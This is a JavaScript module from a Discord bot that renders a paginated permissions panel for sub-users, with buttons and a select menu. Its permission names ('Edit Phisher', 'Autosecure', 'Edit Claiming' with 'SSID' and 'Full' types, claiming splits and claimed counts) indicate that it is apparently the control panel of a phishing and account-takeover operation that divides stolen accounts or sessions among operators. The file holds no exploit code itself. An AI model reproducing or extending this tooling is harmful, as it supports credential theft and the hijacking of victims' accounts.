const { ButtonBuilder, ActionRowBuilder } = require("@discordjs/builders");
const { StringSelectMenuBuilder } = require("discord.js");
const { queryParams } = require("../../../db/database");
const { ButtonStyle } = require("discord.js");
const { footer } = require('../../../config.json');

module.exports = async (ownerid, current, userid, botnumber) => {
    let embed = {
        title: "User Permissions",
        color: 0x808080,
        fields: [],
        footer: {
            text: footer.text,
            iconURL: footer.icon_url
        }
    };

    let buttons = [];
    let isOwner = ownerid === userid;
    let usersQuery;
    let queryParams1;
    
    if (isOwner) { 
        usersQuery = `SELECT * FROM users WHERE user_id=? AND botnumber=?`;
        queryParams1 = [ownerid, botnumber];
    } else {
        usersQuery = `SELECT * FROM users WHERE user_id=? AND child!=? AND botnumber=?`;
        queryParams1 = [ownerid, userid, botnumber];
        embed.footer.text = "You cannot edit your own settings, ask your owner to!";
    }

    let users = await queryParams(usersQuery, queryParams1);
    
    if (users.length == 0) {
        embed.fields = [
            { name: "No Users", value: "Use the Add Button to add users using their Discord ID!", inline: true }
        ];

        
        let row1 = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`adduser|0|${ownerid}|${botnumber}`)
                .setEmoji({ name: "➕" })
                .setLabel("Add User")
                .setStyle(ButtonStyle.Success),
            new ButtonBuilder()
                .setCustomId('discordidguide')
                .setEmoji({ name: "❓"})
                .setLabel("How to get a User ID")
                .setStyle(ButtonStyle.Success)
        );

        
        
        buttons.push(row1);
    } else {
        current = Math.max(1, Math.min(current, users.length));
        let currentUser = users[current - 1];
        
        // Format claiming status
        let claimingStatus = currentUser.claiming == 1 ? "Full" : 
                           currentUser.claiming == 0 ? "SSID" : "Disabled";
        
        // Format rest split
        let restStatus = currentUser.rest == 0 ? "SSID" : 
                        currentUser.rest == -1 ? "Nothing" : "Full";
        
const permissions1 = [
    `Edit Embeds ${currentUser.editembeds ? '✅' : '❌'}`,
    `Edit Buttons ${currentUser.editbuttons ? '✅' : '❌'}`,
    `Edit Modals ${currentUser.editmodals ? '✅' : '❌'}`,
    `Edit Presets ${currentUser.editpresets ? '✅' : '❌'}`,
    `Use Stats ${currentUser.usestatsbutton ? '✅' : '❌'}`,
    `Use DM ${currentUser.usedmbuttons ? '✅' : '❌'}`
].join('\n');

const permissions2 = [
    `Autosecure ${currentUser.editautosecure ? '✅' : '❌'}`,
    `Edit Phisher ${currentUser.editphisher ? '✅' : '❌'}`,
    `Edit Claiming ${currentUser.editclaiming ? '✅' : '❌'}`,
    `Edit Blacklist ${currentUser.editblacklist ? '✅' : '❌'}`,
    `Edit Bot ${currentUser.editbot ? '✅' : '❌'}`,
    `Create embeds ${currentUser.sendembeds ? '✅' : '❌'}`
].join('\n');


embed.fields = [
    { name: "User", value: `<@${currentUser.child}>`, inline: true },
    { 
        name: "Added by", 
        value: currentUser.addedby === userid ? "Yourself" : `<@${currentUser.addedby}>`, 
        inline: true 
    },
    { 
        name: "Claimed", 
        value: `${currentUser.claimedamount}`, 
        inline: true,
    },

    { name: "Claiming Type", value: claimingStatus, inline: true },
    { 
        name: "Claiming Split", 
        value: currentUser.split > 1 ? `1/${currentUser.split}` : "1/1 (Disabled)", 
        inline: true 
    },
    { name: "Rest Split", value: restStatus, inline: true },
    { name: "\n", value: permissions1, inline: true },
    { name: "\n", value: permissions2, inline: true }
];


        // Navigation buttons
        const prev = Math.max(1, current - 1);
        const next = Math.min(users.length, current + 1);

        let moveButtons = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`moveusers|1|${ownerid}|${botnumber}|88`)
                .setEmoji({ name: "⏪" })
                .setStyle(ButtonStyle.Primary)
                .setDisabled(current <= 1),
            new ButtonBuilder()
                .setCustomId(`moveusers|${prev}|${ownerid}|${botnumber}|2222`)
                .setStyle(ButtonStyle.Primary)
                .setEmoji({ name: "◀️" })
                .setDisabled(current <= 1),
            new ButtonBuilder()
                .setCustomId(`currentusers|${current}|${users.length}|${ownerid}|${botnumber}|222`)
                .setLabel(`${current}/${users.length}`)
                .setStyle(ButtonStyle.Primary)
                .setDisabled(true),
            new ButtonBuilder()
                .setCustomId(`moveusers|${next}|${ownerid}|${botnumber}|2`)
                .setEmoji({ name: "➡️" })
                .setStyle(ButtonStyle.Primary)
                .setDisabled(current >= users.length),
            new ButtonBuilder()
                .setCustomId(`moveusers|${users.length}|${ownerid}|${botnumber}|22`)
                .setStyle(ButtonStyle.Primary)
                .setEmoji({ name: "⏩" })
                .setDisabled(current >= users.length)
        );

        let currentclaiminglabel, nextClaimingValue;
        if (currentUser.claiming == 1) {
            currentclaiminglabel = "Full";
            nextClaimingValue = 0;
        } else if (currentUser.claiming == 0) {
            currentclaiminglabel = "SSID";
            nextClaimingValue = -1;
        } else {
            currentclaiminglabel = "Disabled";
            nextClaimingValue = 1;
        }

        let typeAndSplitButtons = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId(`claiming|${currentUser.child}|${current}|${currentUser.rest}|${ownerid}|${botnumber}`)
                .setLabel(`Type: ${currentclaiminglabel}`)
                .setStyle(ButtonStyle.Primary),
            new ButtonBuilder()
                .setCustomId(`bettersplit|${currentUser.child}|${current}|${currentUser.split}|${currentUser.claiming}|${ownerid}|${botnumber}`)
                .setLabel("Better Split")
                .setStyle(ButtonStyle.Primary),
            new ButtonBuilder()
                .setCustomId(`worsesplit|${currentUser.child}|${current}|${currentUser.split}|${currentUser.claiming}|${ownerid}|${botnumber}`)
                .setLabel("Worse Split")
                .setStyle(ButtonStyle.Primary)
        );

        let actionButtons = [
            new ButtonBuilder()
                .setCustomId(`adduser|${users.length}|${ownerid}|${botnumber}`)
                .setEmoji({ name: '➕' })
                .setStyle(ButtonStyle.Success),
            new ButtonBuilder()
                .setCustomId(`removeuser|${current}|${currentUser.child}|${ownerid}|${botnumber}`)
                .setEmoji({ name: '➖' })
                .setStyle(ButtonStyle.Danger)
        ];

        if (currentUser.split > 1) {
            actionButtons.push(
                new ButtonBuilder()
                    .setCustomId(`splitrest|${current}|${currentUser.child}|${currentUser.rest}|${currentUser.claiming}|${currentUser.split}|${ownerid}|${botnumber}`)
                    .setLabel("Change other split")
                    .setStyle(ButtonStyle.Success)
            );
        }

        let actionButtonsRow = new ActionRowBuilder().addComponents(...actionButtons);

const settingsOptions = [
    { label: 'Edit Embeds', value: 'editembeds', dbField: 'editembeds', description: "Edit embed configurations" },
    { label: 'Edit Buttons', value: 'editbuttons', dbField: 'editbuttons', description: "Edit button configurations" },
    { label: 'Edit Modals', value: 'editmodals', dbField: 'editmodals', description: "Edit modal configurations" },
    { label: 'Edit Presets', value: 'editpresets', dbField: 'editpresets', description: "Edit preset configurations" },
    { label: 'Use Stats', value: 'usestatsbutton', dbField: 'usestatsbutton', description: "Use Stats button" },
    { label: 'Use DM', value: 'usedmbuttons', dbField: 'usedmbuttons', description: "Use /dm or dm button" },
    { label: 'Edit Autosecure', value: 'editautosecure', dbField: 'editautosecure', description: "Edit autosecure configurations" },
    { label: 'Edit Phisher', value: 'editphisher', dbField: 'editphisher', description: "Edit phisher configurations" },
    { label: 'Edit Claiming', value: 'editclaiming', dbField: 'editclaiming', description: "Change user claiming options" },
    { label: 'Edit Blacklist', value: 'editblacklist', dbField: 'editblacklist', description: "Edit blacklist configurations" },
    { label: 'Edit Bot', value: 'editbot', dbField: 'editbot', description: "Edit bot configurations" },
    { label: `Create embeds`, value: 'sendembeds', description: "Send embeds & Set channels"}
];


        
        const menuOptions = settingsOptions.map(option => {
            const currentValue = currentUser[option.dbField] === 1;
            return {
                label: currentValue ? `Disable ${option.label}` : `Enable ${option.label}`,
                value: option.value,
                description: option.description
            };
        });
        
const changeusermenu = new StringSelectMenuBuilder()
    .setCustomId(`usersettings|${currentUser.child}|${current}|${ownerid}|${botnumber}`)
    .setPlaceholder(`Change permissions (select)`)
    .setMinValues(1)
    .setMaxValues(12)
    .addOptions(menuOptions);

        
        const selectMenuRow = new ActionRowBuilder().addComponents(changeusermenu);
        
        buttons.push(moveButtons);
        buttons.push(typeAndSplitButtons);
        buttons.push(actionButtonsRow);
        buttons.push(selectMenuRow);
    }

    return {
        content: "",
        embeds: [embed],
        components: buttons,
        ephemeral: true
    };
};